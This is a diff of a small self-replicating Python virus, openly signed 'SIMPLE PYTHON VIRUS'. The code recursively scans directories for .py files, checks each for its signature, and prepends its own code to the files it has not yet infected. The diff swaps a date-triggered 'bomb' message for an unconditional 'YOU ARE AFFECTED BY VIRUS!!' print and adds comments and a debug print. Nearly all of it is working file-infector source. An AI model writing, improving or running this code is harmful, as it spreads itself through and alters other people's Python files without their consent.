@@ -1,14 +1,15 @@
 #!/usr/bin/python
 import os
-import datetime
 SIGNATURE = "SIMPLE PYTHON VIRUS"
 
 def search(path):
     filestoinfect = []
     filelist = os.listdir(path)
     for fname in filelist:
-        if os.path.isdir(path+"/"+fname):
+        # store filename to filestoinfect
+        if os.path.isdir(path+"/"+fname): 
             filestoinfect.extend(search(path+"/"+fname))
+        #check if the file is a .py file and if it been infected already
         elif fname[-3:] == ".py":
             infected = False
             for line in open(path+"/"+fname):
@@ -35,10 +36,8 @@ def infect(filestoinfect):
         f.write(virusstring + temp)
         f.close()
 
-def bomb():
-    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 7:
-        print ("HAHA YOU ARE AFFECTED BY VIRUS!! AND THAT'S AN EVIL LAUGH BY THE WAY!!")
-
 filestoinfect = search(os.path.abspath(""))
+print(len(filestoinfect)) #test reasons
 infect(filestoinfect)
-bomb()
+print ("YOU ARE AFFECTED BY VIRUS!!")
+
